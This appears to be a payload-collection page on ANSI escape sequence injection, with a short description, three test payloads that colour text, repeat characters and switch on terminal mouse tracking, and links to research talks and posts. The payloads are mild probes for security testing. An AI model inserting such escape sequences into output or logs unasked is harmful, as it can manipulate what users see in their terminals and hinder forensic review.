# ANSI Escape Sequence Injection

> An ANSI escape sequence injection attack involved inserting ANSI escape sequences into a program that later renders these sequences without filtering them out. This can lead to various issues such as manipulation of the terminal output or execution of unintended commands

## Summary

* [Exploit code or POC](#exploit-code-or-poc)
* [References](#references)

## Exploit code or POC

Note: The payloads below can be tested in your terminal using `echo -e <payload>` or `printf <payload>`

Basic payload to check if ANSI escape sequences get are filtered out or not. If they are not filtered, `THIS IS GREEN` will be shown in green color.

```
Hello \033[32mTHIS IS GREEN\033[0m\007
```

Repeat a character X times. The example below, ✌ will be repeated 10 times.

```
✌\033[10;b\007
```

Capture mouse movements and output the coordinates into the terminal.

```
\033[?1001h\033[?1002h\033[?1003h\033[?1004h\033[?1005h\033[?1006h\033[?1007h\033[?1015h\033[?10016h\
```


## References

- [Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare](https://www.youtube.com/watch?v=3T2Al3jdY38) - Fredrik (STÖK) Alexandersson
- [Don’t Trust This Title: Abusing Terminal Emulators with ANSI Escape Characters](https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters) - Eviatar Gerzi
- [ANSI Terminal security in 2023 and finding 10 CVEs](https://dgl.cx/2023/09/ansi-terminal-security) - David Leadbeater
